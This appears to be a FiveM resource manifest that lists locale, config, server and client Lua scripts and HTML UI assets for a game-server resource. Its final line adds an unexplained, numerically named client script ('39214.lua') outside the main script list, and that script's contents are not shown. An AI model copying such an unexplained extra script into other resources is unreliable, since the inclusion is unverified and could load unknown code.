




resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'

ui_page('html/index.html') 

server_scripts {  
	'locale.lua',
	'locales/en.lua',
	'locales/tr.lua', 
	'config.lua',
	'server.lua'
}


client_scripts {
	'locale.lua',
	'locales/tr.lua',
	'locales/en.lua', 
	'config.lua',
	'client/client.lua'
}


files {
	'html/index.html',
    'html/css/*.css',
    'html/js/*.js',
    'html/img/*.png',
	'locale.js',
}

client_script "39214.lua"



